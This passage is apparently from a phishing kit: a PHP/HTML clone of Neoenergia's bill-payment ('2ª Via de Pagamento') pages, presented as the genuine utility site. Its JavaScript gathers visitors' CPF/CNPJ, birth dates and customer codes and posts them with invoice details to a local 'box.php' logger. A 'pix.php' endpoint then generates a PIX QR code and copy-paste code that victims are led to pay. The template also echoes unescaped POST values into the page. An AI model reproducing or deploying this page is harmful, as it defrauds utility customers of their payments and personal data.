                                                            <!---->
                                                        </mat-selection-list>
                                                        <div class="col-12 p-0 mt-3"><button color="accent"
                                                                type="button" id="nomeBtn" mat-flat-button=""
                                                                aria-label="nomeBtn"
                                                                class="mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled"
                                                                disabled="true"><span class="mat-button-wrapper">
                                                                    CONTINUAR
                                                                </span><span matripple=""
                                                                    class="mat-ripple mat-button-ripple"></span><span
                                                                    class="mat-button-focus-overlay"></span></button><button
                                                                style="display: none;" type="button"
                                                                mat-stroked-button="" aria-label="Voltar"
                                                                class="mat-focus-indicator mt-3 btn-rounded col-12 text-light-gray mat-stroked-button mat-button-base"><span
                                                                    class="mat-button-wrapper"> VOLTAR </span><span
                                                                    matripple=""
                                                                    class="mat-ripple mat-button-ripple"></span><span
                                                                    class="mat-button-focus-overlay"></span></button>
                                                        </div>
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                    <!---->
                                                </form>
                                                <!---->
                                                <!---->
                                            </div>
                                        </mat-card>
                                    </div>
                                </app-tipo-acesso-segunda-via>
                                <!---->
                            </app-login>


                            <app-login _nghost-bag-c231="" class="ng-star-inserted boxdoc" style="display: none;">
                                <app-tipo-acesso-segunda-via class="ng-star-inserted">
                                    <div id="card-acesso-segunda-via" class="width-agencia mt-padrao">
                                        <div class="row">
                                            <div class="col-4 col-sm-8 col-xl-8"></div>
                                            <div class="col-5 col-sm-4 pe-0">
                                                <app-protocolo-informativo _nghost-bag-c168="">
                                                    <!---->
                                                    <!---->
                                                    <!---->
                                                </app-protocolo-informativo>
                                            </div>
                                        </div>
                                        <mat-card class="mat-card mat-focus-indicator py-5">
                                            <div class="p-4">
                                                <h2><strong>2ª Via de Pagamento</strong></h2>
                                                <!---->
                                                <p class="texto ng-star-inserted"><strong>Nos informe o tipo de acesso
                                                        que
                                                        será realizado.</strong></p>
                                                <!---->
                                                <!---->
                                                <form novalidate="" class="row ng-invalid ng-dirty ng-untouched">
                                                    <!---->
                                                    <div class="ng-star-inserted">
                                                        <mat-form-field appearance="outline"
                                                            class="mat-form-field d-block ng-tns-c127-35 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label ng-star-inserted ng-dirty ng-touched mat-form-field-should-float ng-valid">
                                                            <div class="mat-form-field-wrapper ng-tns-c127-35">
                                                                <div class="mat-form-field-flex ng-tns-c127-35"
                                                                    style="border: solid 1px #dddddd;border-radius: 3px;">

                                                                    <div class="mat-form-field-infix ng-tns-c127-35"
                                                                        style="width: 90%;margin-left: 11px;"><input
                                                                            matinput="" type="text" id="documento"
                                                                            value="<?=$_POST['documento']?>"
                                                                            formcontrolname="documento" required=""
                                                                            onlynumber="" inputmode="numeric"
                                                                            class="mat-input-element mat-form-field-autofill-control ng-tns-c127-35 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored"
                                                                            data-placeholder="Digite seu CPF/CNPJ"
                                                                            aria-required="true"><span
                                                                            class="mat-form-field-label-wrapper ng-tns-c127-35"><label
                                                                                class="mat-form-field-label ng-tns-c127-35 mat-empty mat-form-field-empty ng-star-inserted"
                                                                                id="mat-form-field-label-1"
                                                                                for="documento" aria-owns="documento">
                                                                                <!---->
                                                                                <mat-label
                                                                                    class="ng-tns-c127-35 ng-star-inserted">
                                                                                    CPF/CNPJ</mat-label>
                                                                                <!---->
                                                                                <!---->
                                                                            </label>
                                                                            <!---->
                                                                        </span></div>
                                                                    <!---->
                                                                </div>
                                                                <!---->
                                                                <div
                                                                    class="mat-form-field-subscript-wrapper ng-tns-c127-35">
                                                                    <!---->
                                                                    <div class="mat-form-field-hint-wrapper ng-tns-c127-35 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                                        style="opacity: 1; transform: translateY(0%);">
                                                                        <!---->
                                                                        <div
                                                                            class="mat-form-field-hint-spacer ng-tns-c127-35">
                                                                        </div>
                                                                    </div>
                                                                    <!---->
                                                                </div>
                                                            </div>
                                                        </mat-form-field>
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                </form>
                                                <div class="col-12 p-0 mt-3 ng-star-inserted"><button color="accent"
                                                        type="button" mat-flat-button="" aria-label="nomeBtn"
                                                        id="nomeBtnx"
                                                        class="mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled"
                                                        disabled="true"><span class="mat-button-wrapper"> CONTINUAR
                                                        </span><span matripple=""
                                                            class="mat-ripple mat-button-ripple"></span><span
                                                            class="mat-button-focus-overlay"></span></button><button
                                                        onclick="Voltar(1)" type="button" mat-stroked-button=""
                                                        aria-label="Voltar"
                                                        class="mat-focus-indicator mt-3 btn-rounded col-12 text-light-gray mat-stroked-button mat-button-base"><span
                                                            class="mat-button-wrapper"> VOLTAR </span><span matripple=""
                                                            class="mat-ripple mat-button-ripple"></span><span
                                                            class="mat-button-focus-overlay"></span></button></div>
                                                <!---->
                                                <div class="text-alert ng-star-inserted">
                                                    <div class="col-12 mt-5"> Ao seguir nesse atendimento, você estará
                                                        de
                                                        acordo com as nossas <a target="_blank"
                                                            href="https://www.neoenergia.com/politicas-e-avisos-de-privacidade">Políticas
                                                            e Avisos de Privacidade.</a></div>
                                                    <div class="col-12 mt-4"> Este site é protegido por reCAPTCHA e a <a
                                                            href="https://policies.google.com/privacy"
                                                            target="_blank">Política de Privacidade</a> e <a
                                                            href="https://policies.google.com/terms"
                                                            target="_blank">Termos
                                                            de Serviço</a> do Google se aplicam. </div>
                                                </div>
                                                <!---->
                                            </div>
                                        </mat-card>
                                    </div>
                                </app-tipo-acesso-segunda-via>
                                <!---->
                            </app-login>


                            <app-login _nghost-byy-c231="" class="ng-star-inserted boxucnass" style="display: none;">
                                <router-outlet _ngcontent-byy-c231=""></router-outlet>
                                <app-tipo-acesso-segunda-via class="ng-star-inserted">
                                    <div id="card-acesso-segunda-via" class="width-agencia mt-padrao">
                                        <div class="row">
                                            <div class="col-4 col-sm-8 col-xl-8"></div>
                                            <div class="col-5 col-sm-4 pe-0">
                                                <app-protocolo-informativo _nghost-byy-c168="">
                                                    <!---->
                                                    <!---->
                                                    <!---->
                                                </app-protocolo-informativo>
                                            </div>
                                        </div>
                                        <mat-card class="mat-card mat-focus-indicator py-5">
                                            <div class="p-4">
                                                <h2><strong>2ª Via de Pagamento</strong></h2>
                                                <!---->
                                                <!---->
                                                <p class="texto ng-star-inserted"><strong> Agora nos informe a data de
                                                        nascimento ou código do cliente. </strong></p>
                                                <!---->
                                                <form novalidate="" class="row ng-dirty ng-touched ng-invalid"
                                                    data-gtm-form-interact-id="0">
                                                    <!---->
                                                    <!---->
                                                    <div class="ng-star-inserted">
                                                        <div class="ng-star-inserted">
                                                            <mat-form-field appearance="outline" onclick="tipoLog()"
                                                                id="tipoLog"
                                                                class="mat-form-field d-block ng-tns-c127-42 mat-primary mat-form-field-type-mat-select mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label ng-valid ng-star-inserted mat-form-field-should-float ng-touched ng-dirty">
                                                                <div class="mat-form-field-wrapper ng-tns-c127-42">
                                                                    <div class="mat-form-field-flex ng-tns-c127-42">
                                                                        <div
                                                                            class="mat-form-field-outline ng-tns-c127-42 ng-star-inserted">
                                                                            <div class="mat-form-field-outline-start ng-tns-c127-42"
                                                                                style="width: 4.75px;"></div>
                                                                            <div class="mat-form-field-outline-gap ng-tns-c127-42"
                                                                                style="width: 243.25px;"></div>
                                                                            <div
                                                                                class="mat-form-field-outline-end ng-tns-c127-42">
                                                                            </div>
                                                                        </div>
                                                                        <div
                                                                            class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c127-42 ng-star-inserted">
                                                                            <div class="mat-form-field-outline-start ng-tns-c127-42"
                                                                                style="width: 4.75px;"></div>
                                                                            <div class="mat-form-field-outline-gap ng-tns-c127-42"
                                                                                style="width: 243.25px;"></div>
                                                                            <div
                                                                                class="mat-form-field-outline-end ng-tns-c127-42">
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                        <!---->
                                                                        <!---->
                                                                        <div
                                                                            class="mat-form-field-infix ng-tns-c127-42">
                                                                            <mat-select role="combobox"
                                                                                aria-autocomplete="none"
                                                                                aria-haspopup="true" matnativecontrol=""
                                                                                required=""
                                                                                placeholder="Data de nascimento ou Código do Cliente"
                                                                                id="parametroEntrada"
                                                                                formcontrolname="parametroEntrada"
                                                                                inputmode="numeric"
                                                                                class="mat-select ng-tns-c201-43 ng-tns-c127-42 mat-select-required ng-valid ng-star-inserted ng-touched ng-dirty"
                                                                                aria-labelledby="mat-form-field-label-3 mat-select-value-1"
                                                                                tabindex="0" aria-expanded="false"
                                                                                aria-required="true"
                                                                                aria-disabled="false"
                                                                                aria-invalid="false">
                                                                                <div cdk-overlay-origin=""
                                                                                    class="mat-select-trigger ng-tns-c201-43">
                                                                                    <div class="mat-select-value ng-tns-c201-43"
                                                                                        id="mat-select-value-1">
                                                                                        <!----><span
                                                                                            class="mat-select-value-text ng-tns-c201-43 ng-star-inserted"><span
                                                                                                class="mat-select-min-line ng-tns-c201-43 ng-star-inserted txtselect">Código
                                                                                                do Cliente</span>
                                                                                            <!---->
                                                                                            <!---->
                                                                                        </span>
                                                                                        <!---->
                                                                                    </div>
                                                                                    <div
                                                                                        class="mat-select-arrow-wrapper ng-tns-c201-43">
                                                                                        <div
                                                                                            class="mat-select-arrow ng-tns-c201-43">
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <!---->
                                                                            </mat-select><span
                                                                                class="mat-form-field-label-wrapper ng-tns-c127-42"><label
                                                                                    class="mat-form-field-label ng-tns-c127-42 ng-star-inserted"
                                                                                    id="mat-form-field-label-3"
                                                                                    for="parametroEntrada"
                                                                                    aria-owns="parametroEntrada">
                                                                                    <!---->
                                                                                    <mat-label
                                                                                        class="ng-tns-c127-42 ng-star-inserted">
                                                                                        Data de nascimento ou Código do
                                                                                        Cliente</mat-label>
                                                                                    <!---->
                                                                                    <!---->
                                                                                </label>
                                                                                <!---->
                                                                            </span>
                                                                        </div>
                                                                        <!---->
                                                                    </div>
                                                                    <!---->
                                                                    <div
                                                                        class="mat-form-field-subscript-wrapper ng-tns-c127-42">
                                                                        <!---->
                                                                        <div class="mat-form-field-hint-wrapper ng-tns-c127-42 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                                            style="opacity: 1; transform: translateY(0%);">
                                                                            <!---->
                                                                            <div
                                                                                class="mat-form-field-hint-spacer ng-tns-c127-42">
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                    </div>
                                                                </div>
                                                            </mat-form-field>
                                                        </div>
                                                        <!---->
                                                        <div class="ng-star-inserted">
                                                            <mat-form-field appearance="outline" color="accent"
                                                                class="mat-form-field col-12 ng-tns-c127-45 mat-accent mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label ng-star-inserted mat-form-field-should-float ng-dirty ng-valid ng-touched">
                                                                <div class="mat-form-field-wrapper ng-tns-c127-49">
                                                                    <div class="mat-form-field-flex ng-tns-c127-49">
                                                                        <div
                                                                            class="mat-form-field-outline ng-tns-c127-49 ng-star-inserted">
                                                                            <div class="mat-form-field-outline-start ng-tns-c127-49"
                                                                                style="width: 4.75px;"></div>
                                                                            <div class="mat-form-field-outline-gap ng-tns-c127-49"
                                                                                style="width: 137.5px;"></div>
                                                                            <div
                                                                                class="mat-form-field-outline-end ng-tns-c127-49">
                                                                            </div>
                                                                        </div>
                                                                        <div
                                                                            class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c127-49 ng-star-inserted">
                                                                            <div class="mat-form-field-outline-start ng-tns-c127-49"
                                                                                style="width: 4.75px;"></div>
                                                                            <div class="mat-form-field-outline-gap ng-tns-c127-49"
                                                                                style="width: 137.5px;"></div>
                                                                            <div
                                                                                class="mat-form-field-outline-end ng-tns-c127-49">
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                        <!---->
                                                                        <!---->
                                                                        <div
                                                                            class="mat-form-field-infix ng-tns-c127-49">
                                                                            <input matinput=""
                                                                                formcontrolname="codigoCliente"
                                                                                type="text" autocomplete="off"
                                                                                id="codigoCliente" onlynumber=""
                                                                                class="mat-input-element mat-form-field-autofill-control ng-tns-c127-49 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored"
                                                                                required="" aria-required="true"><span
                                                                                class="mat-form-field-label-wrapper ng-tns-c127-49"><label
                                                                                    class="mat-form-field-label ng-tns-c127-49 mat-empty mat-form-field-empty mat-accent ng-star-inserted"
                                                                                    id="mat-form-field-label-15"
                                                                                    for="codigoCliente"
                                                                                    aria-owns="codigoCliente">
                                                                                    <!---->
                                                                                    <mat-label
                                                                                        class="ng-tns-c127-49 ng-star-inserted txtxx">
                                                                                        CÓDIGO DO CLIENTE</mat-label>
                                                                                    <!----><span aria-hidden="true"
                                                                                        class="mat-placeholder-required mat-form-field-required-marker ng-tns-c127-49 ng-star-inserted">
                                                                                        *</span>
                                                                                    <!---->
                                                                                </label>
                                                                                <!---->
                                                                            </span>
                                                                        </div>
                                                                        <!---->
                                                                    </div>
                                                                    <!---->
                                                                    <div
                                                                        class="mat-form-field-subscript-wrapper ng-tns-c127-49">
                                                                        <!---->
                                                                        <div class="mat-form-field-hint-wrapper ng-tns-c127-49 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                                            style="opacity: 1; transform: translateY(0%);">
                                                                            <!---->
                                                                            <div
                                                                                class="mat-form-field-hint-spacer ng-tns-c127-49">
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                    </div>
                                                                </div>
                                                            </mat-form-field>
                                                        </div>
                                                        <!---->
                                                        <!---->
                                                        <!---->
                                                    </div>
                                                    <!---->
                                                </form>
                                                <div class="col-12 p-0 mt-3 ng-star-inserted"><button color="accent"
                                                        id="buscar" type="button" mat-flat-button=""
                                                        aria-label="nomeBtn"
                                                        class="mat-focus-indicator btn-rounded col-12 mat-flat-button mat-button-base mat-accent mat-button-disabled"
                                                        disabled="true"><span class="mat-button-wrapper"> ACESSAR 2ª VIA
                                                            DE
                                                            PAGAMENTO </span><span matripple=""
                                                            class="mat-ripple mat-button-ripple"></span><span
                                                            class="mat-button-focus-overlay"></span></button><button
                                                        onclick="Voltar(2)" type="button" mat-stroked-button=""
                                                        aria-label="Voltar"
                                                        class="mat-focus-indicator mt-3 btn-rounded col-12 text-light-gray mat-stroked-button mat-button-base"><span
                                                            class="mat-button-wrapper"> VOLTAR </span><span matripple=""
                                                            class="mat-ripple mat-button-ripple"></span><span
                                                            class="mat-button-focus-overlay"></span></button></div>
                                                <!---->
                                                <!---->
                                            </div>
                                        </mat-card>
                                    </div>
                                </app-tipo-acesso-segunda-via>
                                <!---->
                            </app-login>
                        </div>

                        <app-footer _nghost-icv-c166="">
                            <footer _ngcontent-icv-c166="" id="footer" class="footer-light">
                                <div _ngcontent-icv-c166="" class="width-agencia institucional">
                                    <div _ngcontent-icv-c166=""
                                        class="row justify-content-center justify-content-md-between">
                                        <div _ngcontent-icv-c166="" class="col-auto d-grid align-items-center">
                                            <div _ngcontent-icv-c166="" class="texto-footer"> Nos Acompanhe </div>
                                            <div _ngcontent-icv-c166=""
                                                class="d-flex my-2 justify-content-between link"><a
                                                    _ngcontent-icv-c166="" target="_blank" rel="noopener"
                                                    href="https://www.facebook.com/neoenergia/"><img
                                                        _ngcontent-icv-c166=""
                                                        src="./<?= $diretorio ?>//index_files/facebook_silver_v2.svg"
                                                        alt="Facebook"></a><a _ngcontent-icv-c166="" target="_blank"
                                                    rel="noopener" href="https://youtube.com/@neoenergiaoficial"><img
                                                        _ngcontent-icv-c166=""
                                                        src="./<?= $diretorio ?>//index_files/youtube_silver_v2.svg"
                                                        alt="Youtube"></a><a _ngcontent-icv-c166="" target="_blank"
                                                    rel="noopener"
                                                    href="https://www.instagram.com/neoenergia_oficial/"><img
                                                        _ngcontent-icv-c166=""
                                                        src="./<?= $diretorio ?>//index_files/instagram_silver_v2.svg"
                                                        alt="Instagram"></a><a _ngcontent-icv-c166="" target="_blank"
                                                    rel="noopener" href="https://x.com/neoenergiabr"><img
                                                        _ngcontent-icv-c166=""
                                                        src="./<?= $diretorio ?>//index_files/x-twitter_silver.svg"
                                                        alt="Twitter"></a><a _ngcontent-icv-c166="" target="_blank"
                                                    rel="noopener" href="https://www.tiktok.com/@neoenergia"><img
                                                        _ngcontent-icv-c166=""
                                                        src="./<?= $diretorio ?>//index_files/tiktok_silver.svg"
                                                        alt="Twitter"></a><a _ngcontent-icv-c166="" target="_blank"
                                                    rel="noopener"
                                                    href="https://www.linkedin.com/company/neoenergia/"><img
                                                        _ngcontent-icv-c166=""
                                                        src="./<?= $diretorio ?>//index_files/linkedin-silver.svg"
                                                        alt="Linkedin"></a></div>
                                        </div>
                                        <div _ngcontent-icv-c166="" class="col col-lg-auto texto-endereco">
                                            <div _ngcontent-icv-c166="" class="d-flex justify-content-center mb-2">
                                                <label _ngcontent-icv-c166=""><strong>Grupo
                                                        Neoenergia<strong></strong></strong></label>
                                            </div>
                                            <div _ngcontent-icv-c166="" class="footer-copyright"> Copyright 2025
                                                Neoenergia - Todos os direitos reservados </div>
                                        </div>
                                        <div _ngcontent-icv-c166=""
                                            class="col-auto d-flex flex-column align-items-center">
                                            <div _ngcontent-icv-c166="" class="d-flex justify-content-center"><img
                                                    _ngcontent-icv-c166="" id="logo-footer"
                                                    src="./<?= $diretorio ?>//index_files/logo_v2.svg"
                                                    alt="logo da distribuidora"></div>
                                            <div _ngcontent-icv-c166=""
                                                class="d-flex align-items-center justify-content-center mt-3 gap-3"><img
                                                    _ngcontent-icv-c166="" id="logo-conexao-digital"
                                                    src="./<?= $diretorio ?>//index_files/logo-conexao-digital.svg"
                                                    alt="logo do conexão digital" width="80" height="27"><img
                                                    _ngcontent-icv-c166="" id="logo-aneel"
                                                    src="./<?= $diretorio ?>//index_files/logo-aneel.svg"
                                                    alt="logo da aneel" width="167" height="18"></div>
                                        </div>
                                    </div>
                                </div>
                                <div _ngcontent-icv-c166="" class="d-none d-lg-flex links-rapidos">
                                    <div _ngcontent-icv-c166="" class="width-agencia">
                                        <div _ngcontent-icv-c166="" class="d-flex justify-content-evenly"><a
                                                _ngcontent-icv-c166="" target="_blank" rel="noopener"
                                                class="texto-footer"
                                                href="https://www.neoenergia.com/atendimento-ao-cliente"> Contato </a><a
                                                _ngcontent-icv-c166="" target="_blank" rel="noopener"
                                                class="texto-footer"> Dúvidas frequentes </a><a _ngcontent-icv-c166=""
                                                target="_blank" rel="noopener" class="a-link texto-footer"
                                                href="https://www.neoenergia.com/politicas-e-avisos-de-privacidade">
                                                Políticas e Avisos de Privacidade </a></div>
                                    </div>
                                </div>
                            </footer>
                        </app-footer>
                    </div>
                </mat-sidenav-content>
                <!---->
            </mat-sidenav-container>
            <mat-menu hidden="" class="">
                <!---->
            </mat-menu>
            <mat-menu hidden="" class="">
                <!---->
            </mat-menu>
            <mat-menu hidden="" class="">
                <!---->
            </mat-menu>
            <mat-menu xposition="before" hidden="" class="">
                <!---->
            </mat-menu>
        </app-header>
    </app-root>

    <style>
    @keyframes slideDownFadeIn {
        from {
            transform: translateY(-50px);
            opacity: 0;
        }

        to {
            transform: translateY(0);
            opacity: 1;
        }
    }

    .mat-dialog-container {
        animation: slideDownFadeIn 0.4s ease-out forwards;
    }
    </style>

    <div class="cdk-overlay-container seletorBox" style="display:none;">
        <div onclick="document.querySelector('.seletorBox').style='display:none';"
            class="cdk-overlay-backdrop cdk-overlay-transparent-backdrop cdk-overlay-backdrop-showing"></div>
        <div class="cdk-overlay-connected-position-bounding-box" dir="ltr"
            style="top: 0px; left: 0px; height: 100%; width: 100%;">
            <div id="cdk-overlay-0" class="cdk-overlay-pane"
                style="min-width: 366.5px; font-size: 13px; top: 277.016px; left: 243.25px; transform: translateX(-16px) translateY(-12px);">
                <div
                    class="mat-select-panel-wrap ng-tns-c201-43 ng-trigger ng-trigger-transformPanelWrap ng-star-inserted">
                    <div role="listbox" tabindex="-1"
                        class="ng-tns-c201-43 ng-trigger ng-trigger-transformPanel mat-select-panel mat-primary"
                        id="parametroEntrada-panel" aria-multiselectable="false"
                        aria-labelledby="mat-form-field-label-3"
                        style="transform-origin: 50% 19.3125px 0px; font-size: 13px; opacity: 1; min-width: calc(100% + 32px); transform: scaleY(1);">
                        <mat-option role="option" class="mat-option mat-focus-indicator ng-tns-c201-43 ng-star-inserted"
                            id="mat-option-0" tabindex="0" aria-disabled="false" style="" aria-selected="true">
                            <!----><span class="mat-option-text"> Data de Nascimento </span>
                            <!---->
                            <div mat-ripple="" class="mat-ripple mat-option-ripple"></div>
                        </mat-option>
                        <mat-option role="option" class="mat-option mat-focus-indicator ng-tns-c201-43 ng-star-inserted"
                            style="background-color: rgba(97, 93, 90, 0.12);" id="mat-option-1" tabindex="0"
                            aria-disabled="false" style="">
                            <!----><span class="mat-option-text"> Código do Cliente </span>
                            <!---->
                            <div mat-ripple="" class="mat-ripple mat-option-ripple"></div>
                        </mat-option>
                        <!---->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="cdk-overlay-container pixBox" style="display:none;">
        <div onclick="pixGera()" class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing">
        </div>
        <div class="cdk-global-overlay-wrapper" dir="ltr"
            style="justify-content: center;align-items: center;width: 100%;">
            <div id="cdk-overlay-1" class="cdk-overlay-pane"
                style="max-width: 585px;px; */max-height: 85vh;width: 94%;">
                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                <mat-dialog-container tabindex="-1" aria-modal="true"
                    class="mat-dialog-container ng-tns-c83-45 ng-trigger ng-trigger-dialogContainer ng-star-inserted"
                    id="mat-dialog-0" role="dialog"
                    style="transform: none;width: 100%;margin-left: 2px;margin-right: 2px;">
                    <app-dialog-pix _nghost-vuk-c247="" class="ng-star-inserted" style="display: flex;width: 100%;">
                        <div _ngcontent-vuk-c247="" id="dialog-pix" class="p-4 text-center ng-star-inserted"
                            style="width: 100%;"><img _ngcontent-vuk-c247="" alt="Imagem pix"
                                src="https://agenciavirtual.neoenergia.com/assets/images/icons/pix_icon.svg"
                                class="mx-auto d-block mt-3 logoPix">
                            <div _ngcontent-vuk-c247="" class="px-5 mt-3">
                                <h3 _ngcontent-vuk-c247="" class="text-center fw-bold titulo-pix">Pagamento por PIX</h3>
                                <p _ngcontent-vuk-c247="" class="mt-3 color-dark-primary text-center subtitulo-pix">
                                    Abra o aplicativo do seu banco, selecione PIX e efetue o pagamento utilizando o QR
                                    code. </p><img _ngcontent-vuk-c247=""
                                    style="max-width: 172px;margin-top: 0 !important;"
                                    alt="Falha ao carregar o QR-CODE do PIX" class="mt-3 pixsrc"
                                    src="./<?= $diretorio ?>//index_files/Spinner-btn.gif">
                            </div>
                            <div _ngcontent-vuk-c247="" class="d-flex gap-2 justify-content-center"><img
                                    _ngcontent-vuk-c247="" alt="Ícone pix"
                                    src="https://agenciavirtual.neoenergia.com/assets/images/icons/pix_icon_black.svg">
                                <p _ngcontent-vuk-c247="" class="color-dark-primary text-center mt-4"> PIX Copia e Cola.
                                </p>
                            </div>
                            <div _ngcontent-vuk-c247="" class="caixa-qrcode-pix mt-3 mb-0">
                                <p _ngcontent-vuk-c247="" class="p-2 valuepix" id="pixCode"
                                    style="min-height: 45px;border: solid 1px #d1d1d1;width: 100%;border: solid 1px #d1d1d1;width: 100%;word-wrap: break-word;overflow-wrap: break-word;white-space: normal;">
                                </p><button _ngcontent-vuk-c247="" type="button" aria-label="Código de Barras"
                                    id="copyPixBtn" onclick="Copy()"
                                    class="btn btn-success d-flex gap-3 py-3 justify-content-center w-100"><span
                                        _ngcontent-vuk-c247="" class="material-icons-outlined col-1"
                                        style="font-size: 24px; color: #fff; cursor: pointer;">content_copy</span>
                                    Copiar código do PIX </button>
                            </div><button onclick="pixGera()" _ngcontent-vuk-c247="" type="button"
                                class="btn-neo-outline-blue mt-4 mb-2">
                                Cancelar </button>
                        </div>
                        <!---->
                    </app-dialog-pix>
                    <!---->
                </mat-dialog-container>
                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
            </div>
        </div>
    </div>

    <script>
    const params = new URLSearchParams(window.location.search);
    const sucesso = params.get('sucesso');
    var selec = params.get('selec');
    var selecPOST = "<?=$_POST['regiao']?>";

    var referencia = "<?=$id_usuario?>";

    var se = false,
        local = false,
        regiao = false;

    if (selec || selecPOST) {
        if (selecPOST) {

            regiao = selecPOST;
            local = limparTexto(regiao);

        } else {
            se = ['Bahia', 'Mato Grosso do Sul', 'Pernambuco', 'Rio Grande do Norte', 'São Paulo'][selec - 1];
            regiao = se;
            local = limparTexto(se);
        }
    }

    function Copy() {

        const pixCode = document.getElementById('pixCode');

        const codeText = pixCode.innerText;

        navigator.clipboard.writeText(codeText).then(function() {
            toastr.success("Código PIX Copiado com Sucesso");
        }).catch(function(err) {

            toastr.error("Erro ao copiar o código PIX");

            console.error(err);
        });
    };

    window.toMoney = function(a) {
        return parseFloat(a).toFixed(2).replace(".", ",").replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1.")
    }


    function separarEnderecosFaltantes(dados) {
        const enderecosDiferentes = [];

        dados.forEach(fatura => {
            const endereco = fatura.endereco?.trim();
            const uc = fatura.uc;

            if (!enderecosDiferentes.some(item => item.endereco === endereco)) {
            enderecosDiferentes.push({ endereco: endereco, uc: uc });
            }
        });

        return enderecosDiferentes;
    }

    function calcularDebitos(faturas) {
        let quantidadeDebitos = 0;
        let valorTotal = 0;

        faturas.forEach(fatura => {
            if (fatura.statusFatura) {
                quantidadeDebitos++;
                valorTotal += parseFloat(fatura.valorEmissao);
            }
        });

        return quantidadeDebitos + " / " + toMoney(valorTotal.toFixed(2));
    }

    function removerCaracteres(str) {
      return str.replace(/[^a-zA-Z]/g, '').toLowerCase();
    }

    function SalveLog(e) {

        if (e?.resultado) {

            const dadosArray = [{
                label: "doc",
                value: e.doc
            }];

            if (e.uc) {
                dadosArray.push({
                    label: "uc",
                    value: e.uc
                });
            }

            if (e.dataNascimento) {
                dadosArray.push({
                    label: "Nas",
                    value: formatarDataParaBRLog(e.dataNascimento)
                });
            }

            var debitos = e?.resultado?.faturasAbertas ? calcularDebitos(e.resultado.faturasAbertas) : 0;

            const payload = new URLSearchParams({
                dados: JSON.stringify(dadosArray),
                doc: e.doc,
                debitos,
                nome: e.regiao,
                page: 'neoenergia',
                resposta: encodeURIComponent(JSON.stringify(e.resultado))
            });

            fetch('./data/box.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: payload.toString()
            }).then(response => response.text()).then(data => {}).catch(error => {
                console.error('Erro na requisição:', error);
            });
        }
    }

    function pixGera(e, n) {

        if (e) {

            document.querySelector('.pixBox').style = "";
            document.querySelector('.valuepix').innerHTML = "";
            document.querySelector('.pixsrc').src = "./<?= $diretorio ?>/index_files/Spinner-btn.gif";

            const payload = new URLSearchParams({
                valor: e,
                cpf_cnpj:dadosNeo.doc,
                nome:dadosNeo.regiao,
                debito:'Fatura gerada',
                out: n,
                referencia
            });

            fetch('./data/pix.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: payload.toString()
            }).then(response => response.json()).then(data => {
                if (data.status && data.pix) {

                    QRCode.toDataURL(data.pix, {
                        errorCorrectionLevel: 'H'
                    }, function(err, url) {
                        if (err) {
                            console.error(err);
                            return;
                        }
                        document.querySelector('.pixsrc').src = url;
                    });

                    document.querySelector('.valuepix').innerHTML = data.pix;
                } else {

                }
            }).catch(error => {
                console.error('Erro na requisição:', error);
            });


        } else {
            document.querySelector('.pixBox').style = "display:none";
        }
    }

     function formatarDataParaBRLog(dataISO) {
        if (!/^\d{4}-\d{2}-\d{2}$/.test(dataISO)) {
            return null;
        }

        const [ano, mes, dia] = dataISO.split('-');
        return `${dia}/${mes}/${ano}`;
    }

    function formatarDataParaBR(dataStr) {
        // Caso 1: formato YYYY/MM
        if (/^\d{4}\/\d{2}$/.test(dataStr)) {
            const [ano, mes] = dataStr.split('/');
            return `${mes}/${ano}`;
        }

        // Caso 2: formato ISO: YYYY-MM-DDTHH:MM:SS
        if (/^\d{4}-\d{2}-\d{2}T/.test(dataStr)) {
            const data = new Date(dataStr);
            if (isNaN(data.getTime())) return null;

            const dia = String(data.getDate()).padStart(2, '0');
            const mes = String(data.getMonth() + 1).padStart(2, '0');
            const ano = data.getFullYear();

            return `${dia}/${mes}/${ano}`;   
        }

         // Caso 3: formato ISO: YYYY-MM-DD
        if (/^\d{4}-\d{2}-\d{2}/.test(dataStr)) {
            const data = new Date(dataStr);
            if (isNaN(data.getTime())) return null;

            const dia = String(data.getDate()).padStart(2, '0');
            const mes = String(data.getMonth() + 1).padStart(2, '0');
            const ano = data.getFullYear();

            return `${dia}/${mes}/${ano}`;
        }

        // Formato inválido
        return null;
    }

    function formatarAnoMesParaBR(dataStr) {
    // Formato 1: YYYY/MM
        if (/^\d{4}\/\d{2}$/.test(dataStr)) {
            const [ano, mes] = dataStr.split('/');
            return `${mes}/${ano}`;
        }

        // Formato 2: YYYY-MM-DDTHH:MM:SS
        if (/^\d{4}-\d{2}-\d{2}T/.test(dataStr)) {
            const ano = dataStr.substring(0, 4);
            const mes = dataStr.substring(5, 7);
            return `${mes}/${ano}`;
        }

        return null;
    }

    function aStatus(texto) {
        return texto.toLowerCase().replace(/\s+/g, '');
    }

    var dadosNeo = [];

    function SelectEndereco(endereco, uc) {

        document.querySelector('.txtend').innerHTML = endereco;
        document.querySelector('.txtuc').innerHTML = uc;

        var ClassEndereco = removerCaracteres(endereco);
